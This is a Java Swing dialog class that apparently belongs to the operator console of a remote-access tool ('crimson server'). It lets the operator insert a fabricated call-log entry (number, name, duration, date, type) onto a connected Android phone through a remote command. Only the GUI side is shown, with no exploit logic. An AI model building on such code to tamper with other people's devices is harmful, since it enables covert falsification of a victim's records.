package subterranean.crimson.server.graphics.panels.cp.mobile;

import java.awt.BorderLayout;
import java.awt.FlowLayout;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.Date;

import javax.swing.DefaultComboBoxModel;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.border.EmptyBorder;

import net.sourceforge.jcalendarbutton.JCalendarButton;
import subterranean.crimson.server.commands.AndroidCommands;
import subterranean.crimson.server.network.Connection;
import subterranean.crimson.universal.containers.CallLog;

public class InsertLog extends JDialog {

	private final JPanel contentPanel = new JPanel();
	private JTextField textField;
	private JTextField textField_1;
	private JTextField textField_2;
	private JTextField textField_3;

	public InsertLog(final Connection c) {
		setResizable(false);
		setTitle("Insert Entry");
		setBounds(100, 100, 386, 193);
		getContentPane().setLayout(new BorderLayout());
		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		getContentPane().add(contentPanel, BorderLayout.CENTER);
		contentPanel.setLayout(null);

		JLabel lblDirection = new JLabel("Type:");
		lblDirection.setBounds(12, 12, 40, 16);
		contentPanel.add(lblDirection);

		final JComboBox comboBox = new JComboBox();
		comboBox.setModel(new DefaultComboBoxModel(new String[] { "Incoming", "Outgoing", "Missed" }));
		comboBox.setBounds(55, 8, 94, 25);
		contentPanel.add(comboBox);
		{
			JLabel lblPhoneNumber = new JLabel("Phone Number:");
			lblPhoneNumber.setBounds(12, 52, 89, 16);
			contentPanel.add(lblPhoneNumber);
		}

		textField = new JTextField();
		textField.setBounds(119, 50, 94, 20);
		contentPanel.add(textField);
		textField.setColumns(10);

		JLabel lblDuration = new JLabel("Duration(seconds):");
		lblDuration.setBounds(166, 12, 110, 16);
		contentPanel.add(lblDuration);

		textField_1 = new JTextField();
		textField_1.setBounds(285, 10, 79, 20);
		contentPanel.add(textField_1);
		textField_1.setColumns(10);

		JCheckBox chckbxNewCall = new JCheckBox("New Call");
		chckbxNewCall.setBounds(12, 76, 94, 24);
		contentPanel.add(chckbxNewCall);

		JLabel lblCachedName = new JLabel("Name:");
		lblCachedName.setBounds(227, 52, 51, 16);
		contentPanel.add(lblCachedName);

		textField_2 = new JTextField();
		textField_2.setBounds(270, 50, 94, 20);
		contentPanel.add(textField_2);
		textField_2.setColumns(10);

		JLabel lblDate = new JLabel("Date:");
		lblDate.setBounds(119, 82, 55, 16);
		contentPanel.add(lblDate);

		textField_3 = new JTextField();
		textField_3.setBounds(166, 78, 104, 20);
		contentPanel.add(textField_3);
		textField_3.setColumns(10);

		// calendar
		JCalendarButton payload_calender = new JCalendarButton();
		payload_calender.addPropertyChangeListener(new java.beans.PropertyChangeListener() {
			public void propertyChange(java.beans.PropertyChangeEvent evt) {
				if (evt.getNewValue() instanceof Date) {

					textField_3.setText(((Date) evt.getNewValue()).toString());
				}
			}
		});
		payload_calender.setBounds(285, 80, 30, 20);
		contentPanel.add(payload_calender);

		{
			JPanel buttonPane = new JPanel();
			buttonPane.setLayout(new FlowLayout(FlowLayout.RIGHT));
			getContentPane().add(buttonPane, BorderLayout.SOUTH);
			{
				JButton cancelButton = new JButton("Cancel");
				cancelButton.addMouseListener(new MouseAdapter() {
					@Override
					public void mousePressed(MouseEvent e) {
						dispose();
					}
				});
				buttonPane.add(cancelButton);
			}
			{
				JButton okButton = new JButton("Insert");
				okButton.addMouseListener(new MouseAdapter() {
					@Override
					public void mousePressed(MouseEvent e) {
						CallLog cl = new CallLog();
						cl.setDuration(Long.parseLong(textField_1.getText()));
						cl.setPhoneNumber(textField.getText());
						cl.setName(textField_2.getText());
						cl.setDate(new Date(textField_3.getText()));
						if (comboBox.getSelectedItem().equals("Incoming")) {
							cl.setType(1);
						} else if (comboBox.getSelectedItem().equals("Outgoing")) {
							cl.setType(2);
						} else {
							cl.setType(3);
						}
						AndroidCommands.writeCallLog(c, cl);
						dispose();
					}
				});
				buttonPane.add(okButton);
			}
		}
	}
}
